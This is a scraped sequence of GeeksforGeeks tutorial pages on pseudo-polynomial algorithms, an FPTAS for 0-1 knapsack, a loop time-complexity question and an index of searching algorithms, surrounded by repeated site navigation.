for nth Catalan NumberBell Numbers (Number of ways to Partition a Set)Binomial Coefficient | DP-9Permutation CoefficientTiling ProblemGold Mine ProblemCoin Change | DP-7Find minimum number of coins that make a given valueAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops) Pseudo-polynomial Algorithms Last Updated: 23-10-2019 What is Pseudo-polynomial? An algorithm whose worst case time complexity depends on numeric value of input (not number of inputs) is called Pseudo-polynomial algorithm. For example, consider the problem of counting frequencies of all elements in an array of positive numbers. A pseudo-polynomial time solution for this is to first find the maximum value, then iterate from 1 to maximum value and for each value, find its frequency in array. This solution requires time according to maximum value in input array, therefore pseudo-polynomial. On the other hand, an algorithm whose time complexity is only based on number of elements in array (not value) is considered as polynomial time algorithm. Pseudo-polynomial and NP-Completeness Some NP-Complete problems have Pseudo Polynomial time solutions. For example, Dynamic Programming Solutions of 0-1 Knapsack, Subset-Sum and Partition problems are Pseudo-Polynomial. NP complete problems that can be solved using a pseudo-polynomial time algorithms are called weakly NP-complete. Reference: https://en.wikipedia.org/wiki/Pseudo-polynomial_time This article is contributed by Dheeraj Gupta. If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 4 (Analysis of Loops)Asymptotic Analysis and comparison of sorting algorithmsAnalysis of Algorithms | Set 5 (Practice Problems)Analysis of algorithms | little o and little omega notationsLoop Invariant Condition with Examples of Sorting AlgorithmsAnalysis of Algorithms | Big-O analysisAlgorithms | Recurrences | Set 1Difference between Deterministic and Non-deterministic AlgorithmsAlgorithms Sample Questions | Recurrences | Set 2Algorithms Sample Questions | Set 3 | Time Order AnalysisSorting Algorithms Visualization : Bubble SortTime-Space Trade-Off in AlgorithmsAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)The Slowest Sorting AlgorithmsAnalysis of Algorithms | Set 3 (Asymptotic Notations) Article Tags : Analysisknapsack thumb_up 16 To-do Done 2.3 Based on 81 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Time Complexity where loop variable is incremented by 1, 2, 3, 4 .. Next last_page Time Complexity of a Loop when Loop variable “Expands or Shrinks” exponentially Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Complexity of different operations in Binary tree, Binary Search Tree and AVL treeDifference between NP hard and NP complete problemPractice Questions on Time Complexity AnalysisComplexity Analysis of Binary Search More related articles in Analysis Understanding Time Complexity with Simple ExamplesCyclomatic ComplexityProof that SAT is NP CompleteTime complexity of recursive Fibonacci programAnalysis of different sorting techniques room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Polynomial Time Approximation Scheme - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ RecursionA* Search AlgorithmDifference between BFS and DFSHow to write a Pseudo Code?Data Structures and Algorithms Online Courses : Free and PaidRecursive Practice Problems with SolutionsPlayfair Cipher with ExamplesConverting Roman Numerals to Decimal lying between 1 to 3999Commonly Asked Algorithm Interview Questions | Set 1Quick Sort vs Merge SortComplexity Analysis of Binary SearchMid-Point Circle Drawing AlgorithmComparison among Bubble Sort, Selection Sort and Insertion SortGenerate all permutation of a set in PythonDDA Line generation Algorithm in Computer GraphicsDesign a Chess GameBresenham’s Line Generation AlgorithmHow can one become good at Data structures and Algorithms easily?K means Clustering - IntroductionLower and Upper Bound TheoryThe Two Water Jug PuzzleLine Clipping | Set 1 (Cohen–Sutherland Algorithm)Columnar Transposition CipherMust do Math for Competitive ProgrammingArray of Vectors in C++ STLCyclomatic ComplexityK-Nearest NeighboursPriority CPU Scheduling with different arrival time - Set 2MO's Algorithm (Query Square Root Decomposition) | Set 1 (Introduction)Rail Fence Cipher - Encryption and Decryption Polynomial Time Approximation Scheme Last Updated: 04-09-2019 It is a very well know fact that there is no known polynomial time solution for NP Complete problems and these problems occur a lot in real world (See this, this and this for example). So there must be a way to handle them. We have seen algorithms to these problems which are p approximate (For example 2 approximate for Travelling Salesman). Can we do better? Polynomial Time Approximation Scheme (PTAS) is a type of approximate algorithms that provide user to control over accuracy which is a desirable feature. These algorithms take an additional parameter ε > 0 and provide a solution that is (1 + ε) approximate for minimization and (1 – ε) for maximization. For example consider a minimization problem, if ε is 0.5, then the solution provided by the PTAS algorithm is 1.5 approximate. The running time of PTAS must be polynomial in terms of n, however, it can be exponential in terms of ε. In PTAS algorithms, the exponent of the polynomial can increase dramatically as ε reduces, for example if the runtime is O(n(1/ε)!) which is a problem. There is a stricter scheme, Fully Polynomial Time Approximation Scheme (FPTAS). In FPTAS, algorithm need to polynomial in both the problem size n and 1/ε. Example (0-1 knapsack problem): We know that 0-1 knapsack is NP Complete. There is a DP based pseudo polynomial solution for this. But if input values are high, then the solution becomes infeasible and there is a need of approximate solution. One approximate solution is to use Greedy Approach (compute value per kg for all items and put the highest value per kg first if it is smaller than W), but Greedy approach is not PTAS, so we don’t have control over accuracy. Below is a FPTAS solution for 0-1 Knapsack problem: Input: W (Capacity of Knapsack) val[0..n-1] (Values of Items) wt[0..n-1] (Weights of Items) Find the maximum valued item, i.e., find maximum value in val[]. Let this maximum value be maxVal. Compute adjustment factor k for all values k = (maxVal * ε) / n Adjust all values, i.e., create a new array val'[] that values divided by k. Do following for every value val[i]. val'[i] = floor(val[i] / k) Run DP based solution for reduced values, i,e, val'[0..n-1] and all other parameter same. The above solution works in polynomial time in terms of both n and ε. The solution provided by this FPTAS is (1 – ε) approximate. The idea is to rounds off some of the least significant digits of values then they will be bounded by a polynomial and 1/ε. Example: val[] = {12, 16, 4, 8} wt[] = {3, 4, 5, 2} W = 10 ε = 0.5 maxVal = 16 [maximum value in val[]] Adjustment factor, k = (16 * 0.5)/4 = 2.0 Now we apply DP based solution on below modified instance of problem. val'[] = {6, 8, 2, 4} [ val'[i] = floor(val[i]/k) ] wt[] = {3, 4, 5, 2} W = 10 How is the solution (1 – ε) * OPT? Here OPT is the optimal value. Let S be the set produced by above FPTAS algorithm and total value of S be val(S). We need to show that val(S) >= (1 - ε)*OPT Let O be the set produced by optimal solution (the solution with total value OPT), i.e., val(O) = OPT. val(O) - k*val'(O) <= n*k [Because val'[i] = floor(val[i]/k) ] After the dynamic programming step, we get a set that is optimal for the scaled instance and therefore must be at least as good as choosing the set O with the smaller profits. From that, we can conclude, val'(S) >= k . val'(O) >= val(O) - nk >= OPT - ε * maxVal >= OPT - ε * OPT [OPT >= maxVal] >= (1 - ε) * OPT Sources: http://math.mit.edu/~goemans/18434S06/knapsack-katherine.pdf https://en.wikipedia.org/wiki/Polynomial-time_approximation_scheme This article is contributed by Dheeraj Gupta. If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Maximum removal from array when removal time >= waiting timeCount Fibonacci numbers in given range in O(Log n) time and O(1) spacePriority CPU Scheduling with different arrival time - Set 2Extended Mo's Algorithm with ≈ O(1) time complexityQueries of nCr%p in O(1) time complexityGenerating OTP (One time Password) in PHPFind maximum in a stack in O(1) time and O(1) extra spaceFinding Median of unsorted Array in linear time using C++ STLSchedule elevator to reduce the total time takenCount of sub-strings that do not contain all the characters from the set {'a', 'b', 'c'} at the same timeMicrosoft Interview experience for full time position of software engineer at Microsoft Ireland ResearchAlgorithms Sample Questions | Set 3 | Time Order AnalysisConstruct the Rooted tree by using start and finish time of its DFS traversalHow is the time complexity of Sieve of Eratosthenes is n*log(log(n))?Real time optimized KMP Algorithm for Pattern SearchingMinimum time required to fill the entire matrix with 1'sTime-Space Trade-Off in AlgorithmsImproved By : jokic07, shubhamagarwal0312 Article Tags : Algorithms Practice Tags : Algorithms thumb_up 3 To-do Done 4.5 Based on 63 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Shortest Superstring Problem | Set 2 (Using Set Cover) Next last_page Matrix Exponentiation Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Algorithms Difference between NP hard and NP complete problemTop 50 Array Coding Problems for InterviewsQuadratic Probing in HashingDifference Between Symmetric and Asymmetric Key EncryptionIntroduction to Algorithms More related articles in Algorithms Blowfish Algorithm with ExamplesDifference between Algorithm, Pseudocode and ProgramSCAN (Elevator) Disk Scheduling AlgorithmsElection algorithm and distributed processingWhat are Hash Functions and How to choose a good Hash Function? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

A Time Complexity Question - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortProgram for Fibonacci numbersProgram for nth Catalan NumberBell Numbers (Number of ways to Partition a Set)Binomial Coefficient | DP-9Permutation CoefficientTiling ProblemGold Mine ProblemCoin Change | DP-7Find minimum number of coins that make a given valueAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops) A Time Complexity Question Last Updated: 29-10-2020 What is the time complexity of following function fun()? Assume that log(x) returns log value in base 2. C filter_none edit close play_arrow link brightness_4 code void fun() { int i, j; for (i = 1; i <= n; i++) for (j = 1; j <= log(i); j++) printf("GeeksforGeeks"); } chevron_right filter_none Time Complexity of the above function can be written as θ(log 1) + θ(log 2) + θ(log 3) + . . . . + θ(log n) which is θ(log n!)Order of growth of ‘log n!’ and ‘n log n’ is same for large values of n, i.e., θ(log n!) = θ(n log n). So time complexity of fun() is θ(n log n).The expression θ(log n!) = θ(n log n) can be easily derived from following Stirling’s approximation (or Stirling’s formula). log n! = n*log n - n = O(n*log(n)) Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.Sources: http://en.wikipedia.org/wiki/Stirling%27s_approximation Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:An interesting time complexity questionTime Complexity of building a heapTime Complexity where loop variable is incremented by 1, 2, 3, 4 ..Time Complexity of a Loop when Loop variable “Expands or Shrinks” exponentiallyTime complexity of recursive Fibonacci programPractice Questions on Time Complexity AnalysisTime Complexity Analysis | Tower Of Hanoi (Recursion)Python Code for time Complexity plot of Heap SortC program for Time Complexity plot of Bubble, Insertion and Selection Sort using GnuplotTime Complexity of Loop with PowersUnderstanding Time Complexity with Simple ExamplesWhat does 'Space Complexity' mean?Complexity of different operations in Binary tree, Binary Search Tree and AVL treeKnowing the complexity in competitive programmingCyclomatic ComplexityComplexity Analysis of Binary SearchComplexity analysis of various operations of Binary Min HeapTime taken by Loop unrolling vs Normal loopMeasure execution time with high precision in C/C++Microsoft Interview experience for full time position of software engineer at Microsoft Ireland ResearchImproved By : vroghelia6 Article Tags : Analysis thumb_up 34 To-do Done 2.3 Based on 92 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page What does ‘Space Complexity’ mean? Next last_page Analysis of Algorithms | Set 1 (Asymptotic Analysis) Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Complexity of different operations in Binary tree, Binary Search Tree and AVL treeProof that Clique Decision problem is NP-Complete | Set 2Understanding Time Complexity with Simple ExamplesDifference between NP hard and NP complete problemPractice Questions on Time Complexity Analysis More related articles in Analysis Complexity Analysis of Binary SearchCyclomatic ComplexityAnalysis of Algorithms | Set 5 (Practice Problems)Analysis of different sorting techniquesProof that SAT is NP Complete room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Searching Algorithms - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Searching Algorithms ‘Recent Articles’ on Searching Searching Algorithms are designed to check for an element or retrieve an element from any data structure where it is stored. Based on the type of search operation, these algorithms are generally classified into two categories: Sequential Search: In this, the list or array is traversed sequentially and every element is checked. For example: Linear Search. Interval Search: These algorithms are specifically designed for searching in sorted data-structures. These type of searching algorithms are much more efficient than Linear Search as they repeatedly target the center of the search structure and divide the search space in half. For Example: Binary Search. Linear Search to find the element “20” in a given list of numbers Binary Search to find the element “23” in a given list of numbers Topic : Searching Algorithms Comparisons Library Implementations of Searching Algorithms Coding Problems Quick Links Searching Algorithms : Linear Search Binary Search Jump Search Interpolation Search Exponential Search Sublist Search (Search a linked list in another list) Fibonacci Search The Ubiquitous Binary Search Recursive program to linearly search an element in a given array Recursive function to do substring search Unbounded Binary Search Example (Find the point where a monotonically increasing function becomes positive first time) Comparisons : Linear Search vs Binary Search Interpolation search vs Binary search Why is Binary Search preferred over Ternary Search? Library Implementations of Searching Algorithms : Binary Search functions in C++ STL (binary_search, lower_bound and upper_bound) Arrays.binarySearch() in Java with examples | Set 1 Arrays.binarySearch() in Java with examples | Set 2 (Search in subarray) Collections.binarySearch() in Java with Examples Coding Problems : Find the Missing Number Search an element in a sorted and rotated array Median of two sorted arrays Two elements whose sum is closest to zero Find the smallest and second smallest element in an array Maximum and minimum of an array using minimum number of comparisons k largest(or smallest) elements in an array | added Min Heap method Ceiling in a sorted array Count number of occurrences (or frequency) in a sorted array Find the repeating and the missing | Added 3 new methods Find a Fixed Point in a given array Find the maximum element in an array which is first increasing and then decreasing Find a pair with the given difference Find the k most frequent words from a file Median of two sorted arrays of different sizes Find a peak element Given an array of of size n and a number k, find all elements that appear more than n/k times Find the minimum element in a sorted and rotated array Kth smallest element in a row-wise and column-wise sorted 2D array | Set 1 Find k closest elements to a given value Search in an almost sorted array A Problem in Many Binary Search Implementations Find the first repeating element in an array of integers Find common elements in three sorted arrays Count 1’s in a sorted binary array Given a sorted array and a number x, find the pair in array whose sum is closest to x Find the closest pair from two sorted arrays K’th Smallest/Largest Element in Unsorted Array | Set 1 K’th Smallest/Largest Element in Unsorted Array | Set 2 (Expected Linear Time) K’th Smallest/Largest Element in Unsorted Array | Set 3 (Worst Case Linear Time) Find position of an element in a sorted array of infinite numbers Given a sorted and rotated array, find if there is a pair with a given sum Find the largest pair sum in an unsorted array Find the nearest smaller numbers on left side in an array K’th largest element in a stream Find a pair with maximum product in array of Integers Find the element that appears once in a sorted array Find the odd appearing element in O(Log n) time Find the largest three elements in an array Search an element in an array where difference between adjacent elements is 1 Find three closest elements from given three sorted arrays Find the element before which all the elements are smaller than it, and after which all are greater Binary Search for Rational Numbers without using floating point arithmetic Floor in a Sorted Array Third largest element in an array of distinct elements Second minimum element using minimum comparisons Queries for greater than and not less than Efficient search in an array where difference between adjacent is 1 Print all possible sums of consecutive numbers with sum N Minimum time required to produce m items Make all array elements equal with minimum cost Check if there exist two elements in an array whose sum is equal to the sum of rest of the array Check if reversing a sub array make the array sorted Find all triplets with zero sum Search, insert and delete in an unsorted array Search, insert and delete in a sorted array Move all occurrences of an element to end in a linked list Search in an array of strings where non-empty strings are sorted Smallest Difference Triplet from Three arrays Best First Search (Informed Search) Quick Links : ‘Practice Problems’ on Searching ‘Quizzes’ on Searching If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Sorting Algorithms - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute 